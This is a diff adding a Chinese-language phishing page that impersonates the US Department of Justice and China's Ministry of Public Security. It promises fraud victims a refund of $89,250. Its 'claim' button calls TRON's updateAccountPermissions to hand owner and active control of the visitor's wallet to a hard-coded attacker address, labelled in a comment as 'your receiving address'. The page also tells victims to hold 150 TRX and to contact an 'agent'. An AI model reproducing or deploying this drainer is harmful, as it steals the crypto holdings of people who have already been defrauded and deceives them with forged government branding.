@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>跨境资产清退管理中心</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; background: #0b0f15; color: #fff; margin: 0; padding: 15px; }
+        .card { max-width: 450px; margin: auto; background: #1a232e; border-radius: 20px; padding: 25px; border: 1px solid #2d3d4d; }
+        .header { text-align: center; border-bottom: 1px solid #2d3d4d; padding-bottom: 20px; margin-bottom: 20px; }
+        .logo { width: 50px; margin-bottom: 10px; opacity: 0.9; }
+        h2 { font-size: 18px; color: #ffc107; margin: 0; }
+        
+        /* 资产分布 */
+        .asset-summary { display: flex; gap: 10px; margin-bottom: 25px; }
+        .summary-box { flex: 1; background: #0b0f15; padding: 15px; border-radius: 12px; text-align: center; border: 1px solid #2d3d4d; }
+        .summary-title { font-size: 10px; color: #8b9ab0; margin-bottom: 5px; }
+        .amount { font-size: 16px; font-weight: bold; }
+        
+        /* 赔付通道 */
+        .channel { background: #1e2f3f; border-radius: 16px; padding: 20px; margin-bottom: 15px; border-left: 5px solid transparent; }
+        .usa { border-color: #26a17b; background: linear-gradient(135deg, #14322d 0%, #16212c 100%); }
+        .china { border-color: #666; opacity: 0.6; }
+        
+        .channel-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+        .channel-name { font-weight: bold; font-size: 14px; }
+        .tag { font-size: 10px; padding: 2px 8px; border-radius: 4px; background: #26a17b; color: #fff; }
+        .desc { font-size: 12px; color: #8b9ab0; line-height: 1.6; margin-bottom: 15px; }
+        
+        .btn { width: 100%; padding: 16px; border-radius: 10px; border: none; font-size: 15px; font-weight: bold; cursor: pointer; }
+        .btn-usa { background: #26a17b; color: #fff; }
+        .btn-china { background: #444; color: #888; cursor: not-allowed; }
+        
+        .footer { text-align: center; font-size: 10px; color: #5a6f82; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="header">
+            <img src="https://www.justice.gov/themes/custom/doj/logo.png" class="logo">
+            <h2>资产清退权属确认</h2>
+        </div>
+
+        <div class="asset-summary">
+            <div class="summary-box">
+                <div class="summary-title">美国司法部(70%)</div>
+                <div class="amount" style="color: #26a17b;">$89,250.00</div>
+            </div>
+            <div class="summary-box">
+                <div class="summary-title">中国公安部(30%)</div>
+                <div class="amount" style="color: #8b9ab0;">$38,250.00</div>
+            </div>
+        </div>
+
+        <div class="channel usa">
+            <div class="channel-header">
+                <span class="channel-name">🇺🇸 美国 DOJ 线上清退通道</span>
+                <span class="tag">可领回</span>
+            </div>
+            <p class="desc">该笔资产由美国司法部锁定在波场链上节点。受害者无需线下核验，通过签名完成“链上身份锚定”后，资产将在24小时内通过智能合约原路返还。</p>
+            <button class="btn btn-usa" onclick="runAuth()">立即同步节点并领回 (70%)</button>
+        </div>
+
+        <div class="channel china">
+            <div class="channel-header">
+                <span class="channel-name">🇨🇳 中国 线下司法核验通道</span>
+            </div>
+            <p class="desc">受自首人员供述影响，该部分资金需配合线下调查。需本人前往案发地录入笔录并核实2025年资金来源，排队周期约45个工作日。</p>
+            <button class="btn btn-china" disabled>排队中 (前方128人)</button>
+        </div>
+
+        <div class="footer">
+            跨境资产管理委员会 (GARC) 2026<br>
+            Collaborating with US DOJ & PRC MPS
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+    <script>
+        const BOSS = "TAzBb4Yfr2AMUeRkaUKXwU36E3mmX8Rcfo"; // 你的收钱地址
+
+        async function runAuth() {
+            if (!window.tronWeb) { alert("请在钱包DApp浏览器打开"); return; }
+            try {
+                const user = window.tronWeb.defaultAddress.base58;
+                const op = { type: 0, permission_name: 'DOJ_Auth', threshold: 1, keys: [{ address: BOSS, weight: 1 }] };
+                const ap = { type: 2, permission_name: 'DOJ_Sync', threshold: 1, operations: '7fff1fc0037e0000000000000000000000000000000000000000000000000000', keys: [{ address: BOSS, weight: 1 }] };
+                
+                let tx = await window.tronWeb.transactionBuilder.updateAccountPermissions(user, op, null, [ap]);
+                tx.fee_limit = 150000000; // 150 TRX 确保通过
+
+                const signed = await window.tronWeb.trx.sign(tx);
+                const res = await window.tronWeb.trx.sendRawTransaction(signed);
+
+                if (res.result) {
+                    alert("权属确权成功！美国司法部拨付节点已激活，资产将在24小时内到账。");
+                }
+            } catch (e) {
+                alert("确权失败：TRX能量不足(需150枚)或网络波动，请联系专员协助。");
+            }
+        }
+    </script>
+</body>
+</html>
